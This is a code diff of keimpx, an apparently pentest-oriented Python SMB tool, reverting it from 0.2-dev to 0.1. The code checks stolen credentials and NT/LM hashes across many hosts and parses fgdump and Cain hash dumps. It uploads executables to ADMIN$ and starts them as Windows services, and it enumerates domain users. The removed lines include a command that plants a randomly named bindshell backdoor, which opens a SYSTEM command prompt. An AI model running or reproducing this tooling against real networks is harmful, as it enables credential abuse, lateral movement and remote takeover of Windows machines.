@@ -5,18 +5,63 @@
 '''
 $Id$
 
-keimpx is an open source tool, released under a modified version of Apache
-License 1.1. It is developed in Python using CORE Impact's Impacket
-library.
+Info:
 
-It can be used to quickly check for the usefulness of credentials across a
-network over SMB.
+TODO
 
-Homepage:                   http://code.google.com/p/keimpx/wiki/Homepage
-Usage:                      http://code.google.com/p/keimpx/wiki/Usage
-Examples:                   http://code.google.com/p/keimpx/wiki/Examples
-Frequently Asked Questions: http://code.google.com/p/keimpx/wiki/FAQ
-Contributors:               http://code.google.com/p/keimpx/wiki/Contributors
+
+How to:
+
+$ ./keimpx.py -h
+This product includes software developed by CORE Security Technologies
+(http://www.coresecurity.com), Python Impacket library
+
+    keimpx 0.1
+    by Bernardo Damele A. G. <bernardo.damele@gmail.com>
+    
+Usage: ./keimpx.py [options]
+
+Options:
+  --version          show program's version number and exit
+  -h, --help         show this help message and exit
+  -v VERBOSE         Verbosity level: 0-2 (default 0)
+  -t TARGET          Target address
+  -l LIST            File with list of targets
+  -U USER            User
+  -P PASSWORD        Password
+  --nt=NTHASH        NT hash
+  --lm=LMHASH        LM hash
+  -c CREDSFILE       File with list of credentials
+  -D DOMAIN          Domain
+  -d DOMAINSFILE     File with list of domains
+  -p PORT            SMB port: 139 or 445 (default 445)
+  -n NAME            Local hostname
+  --threads=THREADS  Maximum simultaneous connections (default 10)
+
+
+Similar tools:
+
+* psexec <http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx> -
+  basically it can be used to login to a remote machine over SMB and
+  execute commands. Very useful as a second step after you've identified
+  which plain-text passwords work across the network. Single executable
+  file, it works on any Windows system.
+
+* smbshell <http://cgi.tenablesecurity.com/tenable/smbshell.php> -
+  pre-compiled NASL script, similar in functionalities to this tool, but
+  it requires nasl interpreter and a bunch of other Nessus libraries to
+  run, not very convenient.
+
+
+Thanks to:
+
+* deanx <deanx@65535.com> - for some classes ripped from him.
+
+* frego <frego@0x3f.net> - for the service deploy/undeploy help.
+
+* gera <gera@coresecurity.com> and the rest of the CORE guys - for
+  developing such cool Python library and providing it with examples.
+
 
 License:
 
@@ -55,13 +100,12 @@ SUCH DAMAGE.
 
 
 __author__ = 'Bernardo Damele A. G. <bernardo.damele@gmail.com>'
-__version__ = '0.2-dev'
+__version__ = '0.1'
 
 
 import binascii
 import logging
 import os
-import random
 import re
 import rlcompleter
 import socket
@@ -78,15 +122,7 @@ from subprocess import mswindows
 from subprocess import PIPE
 from subprocess import Popen
 from subprocess import STDOUT
-from telnetlib import Telnet
 from threading import Thread
-
-try:
-    import psyco
-    psyco.full()
-    psyco.profile()
-except ImportError, _:
-    pass
 
 try:
     from readline import *
@@ -104,12 +140,11 @@ except ImportError:
 
 try:
     from impacket import smb
-    from impacket import ImpactPacket
     from impacket.nmb import NetBIOSTimeout
     from impacket.dcerpc import dcerpc
     from impacket.dcerpc import transport
+    from impacket.dcerpc import samr
     from impacket.dcerpc import svcctl
-    from impacket.dcerpc.samr import *
 except ImportError:
     sys.stderr.write('You need to install Python Impacket library first\n')
     sys.exit(255)
@@ -132,11 +167,6 @@ logger_handler.setFormatter(formatter)
 logger.addHandler(logger_handler)
 logger.setLevel(logging.WARN)
 
-if hasattr(sys, "frozen"):
-    keimpx_path = os.path.dirname(unicode(sys.executable, sys.getfilesystemencoding()))
-else:
-    keimpx_path = os.path.dirname(os.path.realpath(__file__))
-
 
 class credentialsError(Exception):
     pass
@@ -155,10 +185,6 @@ class threadError(Exception):
 
 
 class missingShare(Exception):
-    pass
-
-
-class missingFile(Exception):
     pass
 
 
@@ -182,345 +208,29 @@ def autoCompletion():
         return
 
     completer = CompleterNG({
-                              'help':       None,
-                              'verbosity':  None,
-                              'info':       None,
-                              'exit':       None,
-                              'shares':     None,
-                              'use':        None,
-                              'cd':         None,
-                              'pwd':        None,
-                              'ls':         None,
-                              'cat':        None,
-                              'download':   None,
-                              'upload':     None,
-                              'mkdir':      None,
-                              'rm':         None,
-                              'rmdir':      None,
-                              'deploy':     None,
-                              'undeploy':   None,
-                              'shell':      None,
-                              'users':      None,
-                              'pswpolicy':  None,
-                              'domains':    None,
-                              'regread':    None,
-                              'regwrite':   None,
-                              'regdelete':  None
+                              'help': None,
+                              'info': None,
+                              'verbosity': None,
+                              'shares': None,
+                              'use': None,
+                              'cd': None,
+                              'pwd': None,
+                              'ls': None,
+                              'cat': None,
+                              'download': None,
+                              'upload': None,
+                              'mkdir': None,
+                              'rm': None,
+                              'rmdir': None,
+                              'deploy': None,
+                              'undeploy': None,
+                              'users': None,
+                              'domains': None,
+                              'exit': None
                             })
 
     _rl.set_completer(completer.complete)
     _rl.parse_and_bind('tab: complete')
-
-
-########################################################################
-# Code ripped with permission from deanx's polenum tool,               #
-# http://labs.portcullis.co.uk/application/polenum/                    #
-########################################################################
-
-def get_obj(name):
-    return eval(name)
-
-
-def d2b(a):
-    bin = []
-
-    while a:
-        bin.append(a%2)
-        a /= 2
-
-    return bin[::-1]
-
-
-def display_time(filetime_high, filetime_low, minutes_utc=0):
-    import __builtins__
-    d = filetime_low + (filetime_high)*16**8 # convert to 64bit int
-    d *= 1.0e-7 # convert to seconds
-    d -= 11644473600 # remove 3389 years?
-
-    try:
-        return strftime('%a, %d %b %Y %H:%M:%S +0000ddddd', localtime(d)) # return the standard format day
-    except ValueError, e:
-        return '0'
-
-
-class ExtendInplace(type):
-    def __new__(self, name, bases, dict):
-        prevclass = get_obj(name)
-        del dict['__module__']
-        del dict['__metaclass__']
-
-        # We can't use prevclass.__dict__.update since __dict__
-        # isn't a real dict
-        for k, v in dict.iteritems():
-            setattr(prevclass, k, v)
-
-        return prevclass
-
-
-def convert(low, high, no_zero):
-    if low == 0 and hex(high) == '-0x80000000':
-        return 'Not Set'
-    if low == 0 and high == 0:
-        return 'None'
-    if no_zero: # make sure we have a +ve vale for the unsined int
-        if (low != 0):
-            high = 0 - (high+1)
-        else:
-            high = 0 - (high)
-        low = 0 - low
-
-    tmp = low + (high)*16**8 # convert to 64bit int
-    tmp *= (1e-7) #  convert to seconds
-
-    try:
-        minutes = int(strftime('%M', gmtime(tmp)))  # do the conversion to human readable format
-    except ValueError, e:
-        return 'BAD TIME:'
-
-    hours = int(strftime('%H', gmtime(tmp)))
-    days = int(strftime('%j', gmtime(tmp)))-1
-    time = ''
-
-    if days > 1:
-     time = str(days) + ' days '
-    elif days == 1:
-        time = str(days) + ' day '
-    if hours > 1:
-        time += str(hours) + ' hours '
-    elif hours == 1:
-        time = str(days) + ' hour '    
-    if minutes > 1:
-        time += str(minutes) + ' minutes'
-    elif minutes == 1:
-        time = str(days) + ' minute '
-
-    return time
-
-
-class MSRPCPassInfo:
-    PASSCOMPLEX = {
-                    5: 'Domain Password Complex',
-                    4: 'Domain Password No Anon Change',
-                    3: 'Domain Password No Clear Change',
-                    2: 'Domain Password Lockout Admins',
-                    1: 'Domain Password Store Cleartext',
-                    0: 'Domain Refuse Password Change'
-                  }
-
-
-    def __init__(self, data = None):
-        self._min_pass_length = 0
-        self._pass_hist = 0
-        self._pass_prop= 0
-        self._min_age_low = 0
-        self._min_age_high = 0
-        self._max_age_low = 0
-        self._max_age_high = 0
-        self._pwd_can_change_low = 0
-        self._pwd_can_change_high = 0
-        self._pwd_must_change_low = 0
-        self._pwd_must_change_high = 0
-        self._max_force_low = 0
-        self._max_force_high = 0
-        self._role = 0
-        self._lockout_window_low = 0
-        self._lockout_window_high = 0
-        self._lockout_dur_low = 0
-        self._lockout_dur_high = 0
-        self._lockout_thresh = 0
-
-        if data:
-            self.set_header(data, 1)
-
-
-    def set_header(self,data,level):
-        index = 8
-
-        if level == 1: 
-            self._min_pass_length, self._pass_hist, self._pass_prop, self._max_age_low, self._max_age_high, self._min_age_low, self._min_age_high = unpack('<HHLllll',data[index:index+24])
-            bin = d2b(self._pass_prop)
-
-            if len(bin) != 8:
-                for x in xrange(6 - len(bin)):
-                    bin.insert(0,0)
-
-            self._pass_prop =  ''.join([str(g) for g in bin])    
-
-        if level == 3:
-            self._max_force_low, self._max_force_high = unpack('<ll',data[index:index+8])
-        elif level == 7:
-            self._role = unpack('<L',data[index:index+4])
-        elif level == 12:
-            self._lockout_dur_low, self._lockout_dur_high, self._lockout_window_low, self._lockout_window_high, self._lockout_thresh = unpack('<llllH',data[index:index+18])
-
-
-    def print_friendly(self):
-        print 'Minimum password length: %s' % str(self._min_pass_length or 'None')
-        print 'Password history length: %s' % str(self._pass_hist or 'None' )
-        print 'Maximum password age: %s' % str(convert(self._max_age_low, self._max_age_high, 1))
-        print 'Password Complexity Flags: %s' % str(self._pass_prop or 'None')
-        print 'Minimum password age: %s' % str(convert(self._min_age_low, self._min_age_high, 1))
-        print 'Reset Account Lockout Counter: %s' % str(convert(self._lockout_window_low,self._lockout_window_high, 1)) 
-        print 'Locked Account Duration: %s' % str(convert(self._lockout_dur_low,self._lockout_dur_high, 1)) 
-        print 'Account Lockout Threshold: %s' % str(self._lockout_thresh or 'None')
-        print 'Forced Log off Time: %s' % str(convert(self._max_force_low, self._max_force_high, 1))
-
-        i = 0
-
-        for a in self._pass_prop:
-            print '%s: %s' % (self.PASSCOMPLEX[i], str(a))
-
-            i+= 1
-
-        return
-
-
-class SAMREnumDomainsPass(ImpactPacket.Header):
-    OP_NUM = 0x2E
-
-    __SIZE = 22
-
-    def __init__(self, aBuffer = None):
-        ImpactPacket.Header.__init__(self, SAMREnumDomainsPass.__SIZE)
-
-        if aBuffer:
-            self.load_header(aBuffer)
-
-
-    def get_context_handle(self):
-        return self.get_bytes().tolist()[:20]
-
-
-    def set_context_handle(self, handle):
-        assert 20 == len(handle)
-        self.get_bytes()[:20] = array.array('B', handle)
-
-
-    def get_resume_handle(self):
-        return self.get_long(20, '<')
-
-
-    def set_resume_handle(self, handle):
-        self.set_long(20, handle, '<')
-
-
-    def get_account_control(self):
-        return self.get_long(20, '<')
-
-
-    def set_account_control(self, mask):
-        self.set_long(20, mask, '<')
-
-
-    def get_pref_max_size(self):
-        return self.get_long(28, '<')
-
-
-    def set_pref_max_size(self, size):
-        self.set_long(28, size, '<')
-
-
-    def get_header_size(self):
-        return SAMREnumDomainsPass.__SIZE
-    
-
-    def get_level(self):
-        return self.get_word(20, '<')
-
-
-    def set_level(self, level):
-        self.set_word(20, level, '<')
-
-
-class SAMRRespLookupPassPolicy(ImpactPacket.Header):
-    __SIZE = 4
-
-    def __init__(self, aBuffer = None):
-        ImpactPacket.Header.__init__(self, SAMRRespLookupPassPolicy.__SIZE)
-
-        if aBuffer:
-            self.load_header(aBuffer)
-
-
-    def get_pass_info(self):
-        return MSRPCPassInfo(self.get_bytes()[:-4].tostring())
-
-
-    def set_pass_info(self, info, level):
-        assert isinstance(info, MSRPCPassInfo)
-        self.get_bytes()[:-4] = array.array('B', info.rawData())
-
-
-    def get_return_code(self):
-        return self.get_long(-4, '<')
-
-
-    def set_return_code(self, code):
-        self.set_long(-4, code, '<')
-
-
-    def get_context_handle(self):
-        return self.get_bytes().tolist()[:12]
-
-
-    def get_header_size(self):
-        var_size = len(self.get_bytes()) - SAMRRespLookupPassPolicy.__SIZE
-        assert var_size > 0
-
-        return SAMRRespLookupPassPolicy.__SIZE + var_size
-
-
-class DCERPCSamr:
-    __metaclass__ = ExtendInplace
-
-    def enumpswpolicy(self,context_handle): # needs to make 3 requests to get all pass policy
-        enumpas = SAMREnumDomainsPass()
-        enumpas.set_context_handle(context_handle)
-        enumpas.set_level(1)
-        self._dcerpc.send(enumpas)
-        data = self._dcerpc.recv()
-
-        retVal = SAMRRespLookupPassPolicy(data)
-        pspol = retVal.get_pass_info()
-        enumpas = SAMREnumDomainsPass()
-        enumpas.set_context_handle(context_handle)
-        enumpas.set_level(3)
-        self._dcerpc.send(enumpas)
-        data = self._dcerpc.recv()
-        pspol.set_header(data,3)
-
-        enumpas = SAMREnumDomainsPass()
-        enumpas.set_context_handle(context_handle)
-        enumpas.set_level(7)
-        self._dcerpc.send(enumpas)
-        data = self._dcerpc.recv()
-        pspol.set_header(data,7)
-
-        enumpas = SAMREnumDomainsPass()
-        enumpas.set_context_handle(context_handle)
-        enumpas.set_level(12)
-        self._dcerpc.send(enumpas)
-        data = self._dcerpc.recv()
-        pspol.set_header(data,12)
-
-        return pspol 
-
-
-    def opendomain(self, context_handle, domain_sid):
-        opendom = SAMROpenDomainHeader()
-        opendom.set_access_mask(0x305)
-        opendom.set_context_handle(context_handle)
-        opendom.set_domain_sid(domain_sid)
-        self._dcerpc.send(opendom)
-        data = self._dcerpc.recv()
-        retVal = SAMRRespOpenDomainHeader(data)
-
-        return retVal
-
-########################################################################
-# End of code ripped with permission from deanx's polenum tool,        #
-# http://labs.portcullis.co.uk/application/polenum/                    #
-########################################################################
 
 
 class SMBShell:
@@ -549,8 +259,8 @@ class SMBShell:
         self.pwd = ''
         self.share = None
         self.sharesList = []
-        self.domainsDict = {}
-        self.usersList = set()
+        self.domainsList = []
+        self.usersList = []
 
 
     def __local_exec(self, cmd):
@@ -575,19 +285,19 @@ class SMBShell:
             raise missingShare, 'Share has not been specified'
 
 
-    def eval(self, cmd=None):
+    def eval(self, i=None):
         '''
         Evaluate the command provided via the command prompt
         '''
 
-        if cmd is None:
+        if i is None:
             self.exit()
 
-        elif cmd[0] == '!':
-            self.__local_exec(cmd[1:])
+        elif i[0] == '!':
+            self.__local_exec(i[1:])
             return
 
-        l = string.split(cmd, ' ')
+        l = string.split(i, ' ')
         cmd = l[0]
 
         try:
@@ -600,12 +310,6 @@ class SMBShell:
 
         except smb.SessionError, e:
             logger.error('SMB exception: %s' % str(e).split('code: ')[1])
-
-        except smb.UnsupportedFeature, e:
-            logger.error('SMB exception: %s. Retrying..' % str(e))
-
-            time.sleep(1)
-            self.eval(cmd)
 
         except Exception, e:
             logger.error('Exception: %s' % e)
@@ -660,20 +364,15 @@ rmdir {dirname} - removes the directory under the current path
 
 Services options
 ================
-deploy {service name} {local file} [service args] - deploy remotely a service executable
-undeploy {service name} {remote file} - undeploy remotely a service executable
-
-Shell options
-=============
-shell [port] - spawn a shell listening on a TCP port, by default 2090/tcp
+deploy {service name} {filename} [service args] - deploy remotely a service binary
+undeploy {srvname} {filename} - undeploy remotely a service binary
 
 Users options
 =============
 users [domain] - list users, optionally for a specific domain
-pswpolicy [domain] - list password policy, optionally for a specific domain
 domains - list domains to which the system is part of
 
-Registry options (Soon)
+Registry options (TODO)
 ================
 regread {registry key} - read a registry key
 regwrite {registry key} {registry value} - add a value to a registry key
@@ -768,21 +467,17 @@ regdelete {registry key} - delete a registry key
         if path is None:
             self.pwd = ''
             return
-
         elif path == '.':
             return
-
         elif path == '..':
             sep = self.pwd.split('\\')
             self.pwd = '\\'.join(s for s in sep[:-1])
-
             return
 
         path = self.__replace(path)
 
         if path[0] == '\\':
            self.pwd = path
-
         else:
            self.pwd += '\\%s' % path
 
@@ -797,7 +492,7 @@ regdelete {registry key} - delete a registry key
 
     def dir(self, path=None):
         '''
-        Alias to ls
+        Wrapper method to list files from the current/provided path
         '''
 
         self.ls(path)
@@ -812,20 +507,17 @@ regdelete {registry key} - delete a registry key
 
         if path is None:
             pwd = '%s\\*' % self.pwd
-
         else:
             pwd = '%s\\%s\\*' % (self.pwd, self.__replace(path))
 
         for f in self.__smb.list_path(self.share, pwd):
             if f.is_directory() == 16:
                 is_dir = '<DIR>'
-
             else:
                 is_dir = '     '
 
             if f.get_filesize() == 0:
                 filesize = '   '
-
             else:
                 filesize = f.get_filesize()
 
@@ -857,14 +549,6 @@ regdelete {registry key} - delete a registry key
         self.__smb.close(self.tid, self.fid)
 
 
-    def get(self, filename):
-        '''
-        Alias to download
-        '''
-
-        self.download(filename)
-
-
     def download(self, filename):
         '''
         Download a file from the current path
@@ -879,14 +563,6 @@ regdelete {registry key} - delete a registry key
         fh.close()
 
 
-    def put(self, filename, share=None, destfile=None):
-        '''
-        Alias to upload
-        '''
-
-        self.upload(filename, share=None, destfile=None)
-
-
     def upload(self, filename, share=None, destfile=None):
         '''
         Upload a file in the current path
@@ -896,7 +572,7 @@ regdelete {registry key} - delete a registry key
             fp = open(filename, 'rb')
         except IOError:
             logger.error('Unable to open file \'%s\'' % filename)
-            sys.exit(1)
+            return
 
         if share is None:
             self.__check_share()
@@ -945,111 +621,38 @@ regdelete {registry key} - delete a registry key
         self.__smb.rmdir(self.share, path)
 
 
-    def deploy(self, srvname, local_file, srvargs=None, remote_file=None):
+    def deploy(self, srvname, filename, srvargs='\x00'):
         '''
-        Deploy a Windows service: upload the service executable to the
-        file system, create a service as 'Automatic' and start it
-        '''
-
-        if srvargs is None:
-            srvargs = '\x00'
-        else:
-            srvargs = [ str(srvargs), ]
-
-        if remote_file is None:
-            remote_file = str(os.path.basename(local_file.replace('\\', '/')))
-
-        self.__old_pwd = self.pwd
-        self.pwd = ''
-
-        self.__svcctl_bin_upload(local_file, remote_file)
-        self.__svcctl_connect()
-        self.__svcctl_create(srvname, remote_file)
-        self.__svcctl_start(srvname, srvargs)
-        self.__svcctl_disconnect()
-
-        self.pwd = self.__old_pwd
-
-
-    def undeploy(self, srvname, remote_file):
-        '''
-        Wrapper method to undeploy a Windows service. It stops the
-        services, removes it and removes the executable from the file
-        system
+        Wrapper method to deploy a Windows service. It uploads the service
+        executable to the file system, creates a service as 'Automatic'
+        and starts it
         '''
 
-        remote_file = str(os.path.basename(remote_file.replace('\\', '/')))
-
-        self.__old_pwd = self.pwd
-        self.pwd = ''
-
-        self.__svcctl_connect()
-        self.__svcctl_stop(srvname)
-        self.__svcctl_delete(srvname)
-        self.__svcctl_disconnect()
-        self.__svcctl_bin_remove(remote_file)
-
-        self.pwd = self.__old_pwd
+        self.__service_bin_upload(filename)
+        self.__service_connect()
+        self.__service_create(srvname, filename)
+        self.__service_start(srvname, srvargs)
+        self.__service_disconnect()
 
 
-    def shell(self, port=2090):
+    def undeploy(self, srvname, filename):
         '''
-        Deploy a bindshell backdoor listening on a predefined TCP port for
-        incoming connections then spawning a command prompt as SYSTEM.
+        Wrapper method to undeploy a Windows service. It removes the service
+        executable from the file system and marks the service as 'Disabled'
         '''
 
-        connected = False
-        srvname = ''.join([random.choice(string.letters) for _ in xrange(0, 6)])
-        local_file = os.path.join(keimpx_path, 'contrib', 'srv_bindshell.exe')
-        remote_file = '%s.exe' % ''.join([random.choice(string.lowercase) for _ in xrange(0, 6)])
+        logger.warn('Reboot is needed to fully remove the service')
 
-        if not os.path.exists(local_file):
-            raise missingFile, 'srv_bindshell.exe not found in the contrib subfolder'
-
-        self.deploy(srvname, local_file, port, remote_file)
-
-        logger.info('Connecting to backdoor on port %d, wait..' % int(port))
-
-        for counter in range(0, 3):
-            try:
-                time.sleep(1)
-
-                if str(sys.version.split()[0]) >= "2.6":
-                    tn = Telnet(self.__dstip, int(port), 3)
-                else:
-                    tn = Telnet(self.__dstip, int(port))
-
-                connected = True
-                tn.interact()
-
-            except (socket.error, socket.herror, socket.gaierror, socket.timeout), e:
-                if connected is False:
-                    warn_msg = 'Connection to backdoor on port %d failed (%s)' % (int(port), e[1])
-
-                    if counter < 2:
-                        warn_msg += ', retrying..'
-
-                    logger.warn(warn_msg)
-
-            except Exception, e:
-                logger.error('Exception: %s' % e)
-
-            if connected is True:
-                break
-
-        time.sleep(1)
-        self.undeploy(srvname, remote_file)
+        self.__service_connect()
+        self.__service_stop(srvname)
+        self.__service_delete(srvname)
+        self.__service_disconnect()
+        self.__service_bin_remove(filename)
 
 
     def users(self, usrdomain=None):
         self.__samr_connect()
         self.__samr_users(usrdomain)
-        self.__samr_disconnect()
-
-
-    def pswpolicy(self, usrdomain=None):
-        self.__samr_connect()
-        self.__samr_pswpolicy(usrdomain)
         self.__samr_disconnect()
 
 
@@ -1079,9 +682,9 @@ regdelete {registry key} - delete a registry key
             raise RuntimeError
 
 
-    def __svcctl_connect(self):
+    def __service_connect(self):
         '''
-        Connect to svcctl named pipe
+        Connect to svcctl
         '''
 
         logger.info('Connecting to the SVCCTL named pipe')
@@ -1107,9 +710,9 @@ regdelete {registry key} - delete a registry key
         self.__mgr_handle = resp.get_context_handle()
 
 
-    def __svcctl_disconnect(self):
+    def __service_disconnect(self):
         '''
-        Disconnect from svcctl named pipe
+        Disconnect from svcctl
         '''
 
         logger.debug('Disconneting from the SVCCTL named pipe')
@@ -1121,42 +724,45 @@ regdelete {registry key} - delete a registry key
         self.__dce.disconnect()
 
 
-    def __svcctl_bin_upload(self, local_file, remote_file):
+    def __service_bin_upload(self, filename):
         '''
-        Upload the service executable
+        Upload the service binary
         '''
 
+        srvfilename = os.path.basename(filename)
         share = 'ADMIN$'
 
-        logger.info('Uploading the service executable to \'%s\\%s\'' % (share, remote_file))
+        logger.info('Uploading the service binary file \'%s\' to %s' % (srvfilename, share))
 
-        self.upload(local_file, share, remote_file)
+        self.upload(filename, share, srvfilename)
 
 
-    def __svcctl_bin_remove(self, remote_file):
+    def __service_bin_remove(self, filename):
         '''
-        Remove the service executable
+        Remove the service binary
         '''
 
-        share = 'ADMIN$'
+        srvfilename = os.path.basename(filename)
 
-        logger.info('Removing the service executable \'%s\\%s\'' % (share, remote_file))
+        logger.info('Removing the service binary file \'%s\'' % srvfilename)
 
-        self.rm(remote_file, share)
+        self.rm(srvfilename, share='ADMIN$')
 
 
-    def __svcctl_create(self, srvname, remote_file):
+    def __service_create(self, srvname, filename):
         '''
         Create the service
         '''
 
+        srvfilename = os.path.basename(filename)
+
         logger.info('Creating the service \'%s\'' % srvname)
 
-        data = self.__svc.create_service(self.__mgr_handle, srvname, '%%SystemRoot%%\\%s' % remote_file)
+        data = self.__svc.create_service(self.__mgr_handle, srvname, '%%systemroot%%\\%s' % srvfilename)
         self.rpcerror(data.get_return_code())
 
 
-    def __svcctl_delete(self, srvname):
+    def __service_delete(self, srvname):
         '''
         Delete the service
         '''
@@ -1168,7 +774,7 @@ regdelete {registry key} - delete a registry key
         self.__svc.delete_service(svc_handle)
 
 
-    def __svcctl_start(self, srvname, srvargs):
+    def __service_start(self, srvname, srvargs):
         '''
         Start the service
         '''
@@ -1185,7 +791,7 @@ regdelete {registry key} - delete a registry key
         self.rpcerror(data.get_return_code())
 
 
-    def __svcctl_stop(self, srvname):
+    def __service_stop(self, srvname):
         '''
         Stop the service
         '''
@@ -1204,7 +810,7 @@ regdelete {registry key} - delete a registry key
 
     def __samr_connect(self):
         '''
-        Connect to samr named pipe
+        Connect to samr
         '''
 
         logger.info('Connecting to the SAMR named pipe')
@@ -1213,8 +819,8 @@ regdelete {registry key} - delete a registry key
 
         logger.debug('Binding on Security Account Manager (SAM) interface')
         self.__dce = dcerpc.DCERPC_v5(self.trans)
-        self.__dce.bind(MSRPC_UUID_SAMR)
-        self.__samr = DCERPCSamr(self.__dce)
+        self.__dce.bind(samr.MSRPC_UUID_SAMR)
+        self.__samr = samr.DCERPCSamr(self.__dce)
 
         resp = self.__samr.connect()
         self.rpcerror(resp.get_return_code())
@@ -1224,7 +830,7 @@ regdelete {registry key} - delete a registry key
 
     def __samr_disconnect(self):
         '''
-        Disconnect from samr named pipe
+        Disconnect from samr
         '''
 
         logger.debug('Disconneting from the SAMR named pipe')
@@ -1245,7 +851,9 @@ regdelete {registry key} - delete a registry key
 
         encoding = sys.getdefaultencoding()
 
-        for domain_name, domain in self.domainsDict.items():
+        for domain in self.domainsList:
+            domain_name = domain.get_name()
+
             if usrdomain is not None and usrdomain.upper() != domain_name.upper():
                 continue
 
@@ -1272,104 +880,75 @@ regdelete {registry key} - delete a registry key
                 if r.get_return_code() == 0:
                     info = self.__samr.queryuserinfo(r.get_context_handle()).get_user_info()
                     entry = (uname, uid, info)
-                    self.usersList.add(entry)
+                    self.usersList.append(entry)
                     c = self.__samr.closerequest(r.get_context_handle())
 
-            if self.usersList:
-                num = len(self.usersList)
+        if self.usersList:
+            num = len(self.usersList)
 
-                if num == 1:
-                    logger.info('Enumerated one user')
-                else:
-                    logger.info('Enumerated %d user' % num)
+            if num == 1:
+                logger.info('Enumerated one user')
             else:
-                logger.info('No users enumerated')
+                logger.info('Enumerated %d user' % num)
+        else:
+            logger.info('No users enumerated')
 
-            for entry in self.usersList:
-                user, uid, info = entry
+        for entry in self.usersList:
+            user, uid, info = entry
 
-                print user
-                print '  User ID: %d' % uid
-                print '  Group ID: %d' % info.get_group_id()
-                print '  Enabled: %s' % ('False', 'True')[info.is_enabled()]
+            print user
+            print '  User ID: %d' % uid
+            print '  Group ID: %d' % info.get_group_id()
+            print '  Enabled: %s' % ('False', 'True')[info.is_enabled()]
 
-                try:
-                    print '  Logon count: %d' % info.get_logon_count()
-                except ValueError:
-                    pass
+            try:
+                print '  Logon count: %d' % info.get_logon_count()
+            except ValueError:
+                pass
 
-                try:
-                    print '  Last Logon: %s' % info.get_logon_time()
-                except ValueError:
-                    pass
+            try:
+                print '  Last Logon: %s' % info.get_logon_time()
+            except ValueError:
+                pass
 
-                try:
-                    print '  Last Logoff: %s' % info.get_logoff_time()
-                except ValueError:
-                    pass
+            try:
+                print '  Last Logoff: %s' % info.get_logoff_time()
+            except ValueError:
+                pass
 
-                try:
-                    print '  Kickoff: %s' % info.get_kickoff_time()
-                except ValueError:
-                    pass
+            try:
+                print '  Kickoff: %s' % info.get_kickoff_time()
+            except ValueError:
+                pass
 
-                try:
-                    print '  Last password set: %s' % info.get_pwd_last_set()
-                except ValueError:
-                    pass
+            try:
+                print '  Last password set: %s' % info.get_pwd_last_set()
+            except ValueError:
+                pass
 
-                try:
-                    print '  Password can change: %s' % info.get_pwd_can_change()
-                except ValueError:
-                    pass
+            try:
+                print '  Password can change: %s' % info.get_pwd_can_change()
+            except ValueError:
+                pass
 
-                try:
-                    print '  Password must change: %s' % info.get_pwd_must_change()
-                except ValueError:
-                    pass
+            try:
+                print '  Password must change: %s' % info.get_pwd_must_change()
+            except ValueError:
+                pass
 
-                try:
-                    print '  Bad password count: %d' % info.get_bad_pwd_count()
-                except ValueError:
-                    pass
+            try:
+                print '  Bad password count: %d' % info.get_bad_pwd_count()
+            except ValueError:
+                pass
 
-                items = info.get_items()
+            items = info.get_items()
 
-                for i in MSRPCUserInfo.ITEMS.keys():
-                    name = items[MSRPCUserInfo.ITEMS[i]].get_name()
-                    name = name.encode(encoding, 'replace')
+            for i in samr.MSRPCUserInfo.ITEMS.keys():
+                name = items[samr.MSRPCUserInfo.ITEMS[i]].get_name()
+                name = name.encode(encoding, 'replace')
 
-                    if name:
-                        print '  %s: %s' % (i, name)
-
-            self.usersList = set()
-
-
-    def __samr_pswpolicy(self, usrdomain=None):
-        '''
-        Enumerate password policy on the system
-        '''
-
-        self.__samr_domains(False)
-
-        encoding = sys.getdefaultencoding()
-
-        for domain_name, domain in self.domainsDict.items():
-            if usrdomain is not None and usrdomain.upper() != domain_name.upper():
-                continue
-
-            logger.info('Looking up password policy in domain \'%s\'' % domain_name)
-
-            resp = self.__samr.lookupdomain(self.__mgr_handle, domain)
-            self.rpcerror(resp.get_return_code())
-
-            resp = self.__samr.opendomain(self.__mgr_handle, resp.get_domain_sid())
-            self.rpcerror(resp.get_return_code())
-
-            self.__domain_context_handle = resp.get_context_handle()
-
-            resp = self.__samr.enumpswpolicy(self.__domain_context_handle)
-            resp.print_friendly()
+                if name:
+                    print '  %s: %s' % (i, name)
 
 
     def __samr_domains(self, display=True):
@@ -1389,24 +968,20 @@ regdelete {registry key} - delete a registry key
 
         for domain in range(0, resp.get_entries_num()):
             domain = domains[domain]
-            domain_name = domain.get_name()
-
-            if domain_name not in self.domainsDict:
-                self.domainsDict[domain_name] = domain
+            self.domainsList.append(domain)
 
             if display is True:
-                print '  %s' % domain_name
+                print '  %s' % domain.get_name()
 
 
     def rpcerror(self, code):
         '''
-        Check for an error in a response packet
+        Check for an error in response packet
         '''
 
         if code in dcerpc.rpc_status_codes:
             logger.error('Error during negotiation: %s (%d)' % (dcerpc.rpc_status_codes[code], code))
             raise RuntimeError
-
         elif code != 0:
             logger.error('Unknown error during negotiation (%d)' % code)
             raise RuntimeError
@@ -1744,10 +1319,11 @@ def parse_credentials_file(filename):
 
 
 def parse_credentials(credentials_line):
-    credentials_line = credentials_line.replace('NO PASSWORD*********************', '00000000000000000000000000000000')
-
     fgdumpmatch = re.compile('^(\S*?):.*?:(\S*?):(\S*?):.*?:.*?:')
     fgdump = fgdumpmatch.match(credentials_line)
+
+    emptypassmatch = re.compile('^(\S*?):.*?:NO\sPASSWORD.+')
+    empty = emptypassmatch.match(credentials_line)
 
     cainmatch = re.compile('^(\S*?):.*?:.*?:(\S*?):(\S*?)$')
     cain = cainmatch.match(credentials_line)
@@ -1764,6 +1340,10 @@ def parse_credentials(credentials_line):
             return fgdump.group(1), '', fgdump.group(2), fgdump.group(3)
         except:
             raise credentialsError, 'credentials error'
+
+    # Credentials with empty password (pwdump/pwdumpx/fgdump output format)
+    elif empty:
+        return empty.group(1), '', '', ''
 
     # Credentials with hashes (cain/l0phtcrack output format)
     elif cain:
@@ -1968,11 +1548,8 @@ def cmdline_parser():
 
         parser.add_option('-n', dest='name', help='Local hostname')
 
-        parser.add_option('-T', dest='threads', type='int', default=10,
+        parser.add_option('--threads', dest='threads', type='int', default=10,
                           help='Maximum simultaneous connections (default 10)')
-
-        parser.add_option('-b', dest='batch', action="store_true", default=False,
-                          help='Batch mode: do not ask to get an interactive SMB shell')
 
         (args, _) = parser.parse_args()
 
@@ -2081,9 +1658,6 @@ def main():
 
             print
 
-    if conf.batch is True:
-        return
-
     msg = 'Do you want to get a shell from any of the targets? [Y/n] '
     choice = raw_input(msg)
 
@@ -2164,6 +1738,9 @@ def main():
         shell.run()
     except RuntimeError:
         sys.exit(255)
+    except KeyboardInterrupt:
+        print 'Bye bye!'
+        sys.exit(0)
 
 
 if __name__ == '__main__':
